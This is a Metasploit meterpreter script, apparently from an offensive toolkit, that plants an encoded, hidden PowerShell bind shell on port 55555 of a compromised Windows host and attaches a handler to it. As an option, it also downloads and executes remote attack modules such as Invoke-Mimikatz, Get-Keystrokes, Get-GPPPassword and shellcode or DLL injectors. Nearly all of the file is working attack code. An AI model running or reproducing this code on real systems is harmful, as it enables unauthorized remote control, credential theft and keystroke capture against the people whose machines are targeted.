##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to imporve this script, please try to port it as a post
# module instead. Thank you.
##


# Authors/Contributors: 
# Ben Turner (https://github.com/benpturner/h00k)
# Dave Hardy (https://github.com/davehardy20/)
# Nicholas Nam (nick[at]executionflow.org)
# RageLtMan

#-------------------------------------------------------------------------------
################## Variable Declarations ##################

# Meterpreter Session
@client = client
downloadall = false
errors = false

@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-r"  => [ false,   "The IP of the system being exploited = rhost"],
  "-a"  => [ false,   "Attempt to download all powershell modules"]

)
meter_type = client.platform

################## Function Declarations ##################

  # Usage Message Function
  #-------------------------------------------------------------------------------
  def usage
    print_line "Meterpreter Script for creating a persistent backdoor on a target host."
    print_line(@exec_opts.usage)
    raise Rex::Script::Completed
  end

  # Function for setting multi handler for autocon
  #-------------------------------------------------------------------------------
  def set_handler(rhost,rport)
    mul = client.framework.exploits.create("multi/handler")
    mul.datastore['WORKSPACE'] = @client.workspace
    mul.datastore['PAYLOAD']   = "windows/shell_bind_tcp"
    mul.datastore['RHOST']     = rhost
    mul.datastore['LPORT']     = rport

    mul.exploit_simple(
      'Payload'        => mul.datastore['PAYLOAD'],
      'RunAsJob'       => true
    )
    print_good("Multi/handler started: payload=windows/shell_bind_tcp rhost=" + rhost + " lport:=55555")
  end

  def have_powershell?
    cmd_out = cmd_exec('cmd.exe /c "echo. | powershell get-host"')
    return true if cmd_out =~ /Name.*Version.*InstanceId/m
    return false
  end

  #
  # Insert substitutions into the powershell script
  #
  def make_subs(script, subs)
    subs.each do |set|
      script.gsub!(set[0],set[1])
    end
    if datastore['VERBOSE']
      print_good("Final Script: ")
      script.each_line {|l| print_status("\t#{l}")}
    end
  end

  #
  # Return an array of substitutions for use in make_subs
  #
  def process_subs(subs)
    return [] if subs.nil? or subs.empty?
    new_subs = []
    subs.split(';').each do |set|
      new_subs << set.split(',', 2)
    end
    return new_subs
  end

  #
  # Read in a powershell script stored in +script+
  #
  def read_script(script)
    script_in = ''
    begin
      # Open script file for reading
      fd = ::File.new(script, 'r')
      while (line = fd.gets)
        script_in << line
      end

      # Close open file
      fd.close()
    rescue Errno::ENAMETOOLONG, Errno::ENOENT
      # Treat script as a... script
      script_in = script
    end
    return script_in
  end

  #
  # Return a zlib compressed powershell script
  #
  def compress_script(script_in, eof = nil)

    # Compress using the Deflate algorithm
    compressed_stream = ::Zlib::Deflate.deflate(script_in,
      ::Zlib::BEST_COMPRESSION)

    # Base64 encode the compressed file contents
    encoded_stream = Rex::Text.encode_base64(compressed_stream)

    # Build the powershell expression
    # Decode base64 encoded command and create a stream object
    psh_expression =  "$stream = New-Object IO.MemoryStream(,"
    psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
    # Read & delete the first two bytes due to incompatibility with MS
    psh_expression += "$stream.ReadByte()|Out-Null;"
    psh_expression += "$stream.ReadByte()|Out-Null;"
    # Uncompress and invoke the expression (execute)
    psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
    psh_expression += "$(New-Object IO.Compression.DeflateStream("
    psh_expression += "$stream,"
    psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
    psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"

    # If eof is set, add a marker to signify end of script output
    if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end

    # Convert expression to unicode
    unicode_expression = Rex::Text.to_unicode(psh_expression)

    # Base64 encode the unicode expression
    encoded_expression = Rex::Text.encode_base64(unicode_expression)

    return encoded_expression
  end

  #
  # Execute a powershell script and return the results. The script is never written
  # to disk.
  #
  def execute_script(script, time_out = 15)
    running_pids, open_channels = [], []
    # Execute using -EncodedCommand
    session.response_timeout = time_out
    cmd_out = session.sys.process.execute("powershell -EncodedCommand " +
      "#{script}", nil, {'Hidden' => true, 'Channelized' => true})

    # Add to list of running processes
    running_pids << cmd_out.pid

    # Add to list of open channels
    open_channels << cmd_out

    return [cmd_out, running_pids, open_channels]
  end


################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-r"
    rhost = val
  when "-a"
    downloadall = true
  end
}

script_in=""+
"function Get-Webclient {\n"+
"    $wc = New-Object Net.WebClient\n"+
"    $wc.UseDefaultCredentials = $true\n"+
"    $wc.Proxy.Credentials = $wc.Credentials\n"+
"    $wc\n"+
"}\n"+
"\n"+
"function powerfun($download) {\n"+
"\n"+
"   $modules = @(\n"+
"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1',\n"+
"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1',\n"+
"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1',\n"+
"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1',\n"+
"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1',\n"+
"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1',\n"+
"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1',\n"+
"'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1',\n"+
"'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1',\n"+
"'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1')\n"+
"\n"+
"    $listener = [System.Net.Sockets.TcpListener]55555\n"+
"    $listener.start()\n"+
"    [byte[]]$bytes = 0..255|%{0}\n"+
"    $client = $listener.AcceptTcpClient()\n"+
"    $stream = $client.GetStream() \n"+
"\n"+
"    $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell`nCopyright (C) 2014 Microsoft Corporation. All rights reserved.`n`nInvoke-Shellcode`nInvoke-DllInjection`nInvoke-Mimikatz`nInvoke-NinjaCopy`nGet-GPPPassword`nGet-Keystrokes`nGet-TimedScreenshot`nInvoke-ReflectivePEInjection`nPowerUp`nPowerView`n`nType 'Get-Help Invoke-Reflective -Full' for more details on any module.`n`n\")\n"+
"    $stream.Write($sendbytes,0,$sendbytes.Length)\n"+
"\n"+
"    if ($download -eq 1) { ForEach ($module in $modules)\n"+
"    {\n"+
"       (Get-Webclient).DownloadString($module)|iex\n"+
"    }}\n"+
"\n"+
"    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n"+
"    {\n"+
"        $EncodedText = New-Object System.Text.ASCIIEncoding\n"+
"        $data = $EncodedText.GetString($bytes,0, $i)\n"+
"        $sendback = (IEX $data 2>&1 | Out-String )\n"+
"\n"+
"        $sendback2  = $sendback + \"PS \" + (get-location).Path + \"> \"\n"+
"	 $x = ($error[0] | out-string)\n"+
"	 $error.clear()\n"+
"        $sendback2 = $sendback2 + $x\n"+
"\n"+
"        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n"+
"        $stream.Write($sendbyte,0,$sendbyte.Length)\n"+
"        $stream.Flush()  \n"+
"    }\n"+
"    $client.Close()\n"+
"    $listener.Stop()\n"+
"}\n"+
"\n"

if (downloadall == true)
script_in = script_in + "powerfun 1\n" 
else
script_in = script_in + "powerfun \n"
end

# End of file marker
eof = Rex::Text.rand_text_alpha(8)
env_suffix = Rex::Text.rand_text_alpha(8)

# Get target's computer name
computer_name = session.sys.config.sysinfo['Computer']

# Compress the script
compressed_script = compress_script(script_in, eof)
script = compressed_script
cmd_out, running_pids, open_channels = execute_script(script, 15)
print_status("The PID to kill once you have finished with PowerShell: " + running_pids[0].to_s)

#print_status('Executing the script: ' + script_in)


print_status("Starting PowerShell on host: " + computer_name)

# Default parameters for payload
rhost = @client.session_host
rport = 55555

set_handler(rhost,rport)
print_status("If a shell is unsuccesful, ensure you have access to the target host and port. Maybe you need to add a route (route add ?)")
print("\n")



